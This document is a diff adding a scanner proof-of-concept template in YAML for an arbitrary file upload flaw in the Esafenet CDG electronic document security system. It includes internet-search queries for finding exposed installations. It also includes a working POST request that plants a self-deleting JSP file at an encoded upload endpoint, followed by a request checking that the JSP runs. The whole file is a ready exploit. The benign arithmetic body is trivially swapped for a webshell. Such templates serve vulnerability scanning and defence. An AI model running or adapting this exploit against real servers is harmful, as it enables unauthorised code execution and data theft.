@@ -1,0 +1,37 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="亿赛通-电子文档安全管理系统"
+    hunter-query: app.name=="ESAFENET 亿赛通文档安全管理系统"
+    quake-query: app:"亿赛通电子文档安全管理系统"
+    zoomeye-query: app:"亿赛通电子文档安全管理系统"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+
+name: poc-yaml-esafenet-cdg-uploadfilefromclientserviceforclient-upload
+manual: true
+transport: http
+set:
+    r1: randomInt(100, 500)
+    r2: randomInt(600, 900)
+rules:  
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM
+            body: "<%out.print({{r1}} * {{r2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>"
+            follow_redirects: false
+        expression: response.status == 200
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /tttT.jsp
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+expression: r0() && r1()
